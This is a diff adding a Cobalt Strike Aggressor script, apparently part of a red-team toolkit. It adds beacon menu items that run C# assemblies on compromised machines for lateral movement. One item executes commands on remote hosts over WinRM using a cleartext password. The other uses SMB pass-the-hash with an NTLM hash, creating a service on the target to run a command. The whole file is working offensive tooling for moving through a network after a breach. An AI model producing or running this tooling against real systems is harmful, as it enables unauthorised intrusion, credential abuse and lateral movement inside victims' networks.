@@ -1,0 +1,88 @@
+########################
+##
+## WinRM Item
+##
+########################
+
+item "WinRM w/CSharp"{
+
+    local('$bid');
+        foreach $bid ($1){
+            winrmcsharp($bid);
+      }
+
+    }
+
+    
+########################
+##
+## WinRM Module
+##
+########################
+sub winrmcsharp{
+    $bid = $1;
+    $dialog = dialog("Code Exec with WinRM using CSharp", %(hostname => "", fqdn => "", username => "", pass => "", command => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+		$cmdargs = "$3['hostname'] $3['fqdn'] $3['username'] $3['pass'] $3['command']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing WinRM');
+            bexecute_assembly($bid, script_resource('/exe/winrm.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Execute Code Remotely with WinRM, Using CSharp");
+    drow_text($dialog, "hostname",  "Hostname - Try not to use IP");
+    drow_text($dialog, "fqdn",  "FQDN");
+    drow_text($dialog, "username",  "User Name");
+    drow_text($dialog, "pass",  "Cleartext Password");
+    drow_text($dialog, "command",  "Command to Run");    
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+
+
+########################
+##
+## SMB Execution
+##
+########################
+
+
+item "SMB Code Exec using CSharp"{
+
+    local('$bid');
+        foreach $bid ($1){
+            smbexeccsharp($bid);
+      }
+
+    }
+    
+    
+
+########################
+##
+## SMB Execution Module
+##
+########################
+
+
+sub smbexeccsharp{
+    $bid = $1;
+    $dialog = dialog("Code Exec with SMB using CSharp", %(hash => "", username => "", domain => "", target => "", command => """", servicename => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+		$cmdargs = "hash:$3['hash'] username:$3['username'] domain:$3['domain'] target:$3['target'] command:$3['command'] servicename:$3['servicename']"; 
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Code w/SMBExec');
+            bexecute_assembly($bid, script_resource('/exe/Sharp-SMBExec.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Execute Code Remotely using SMB, Using CSharp - Please use cmd /c or cmd /r if your command runs an executable, also please enclose command in double quotes");
+    drow_text($dialog, "hash",  "NTLM Hash of user");
+    drow_text($dialog, "username",  "User Name");
+    drow_text($dialog, "domain",  "Domain - FQDN Preferred");
+    drow_text($dialog, "target",  "Target to run command on - FQDN Preferred");
+    drow_text($dialog, "command",  "Command to Run - enlose in quotes");    
+    drow_text($dialog, "servicename",  "Name of Service to Create"); 
+    dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
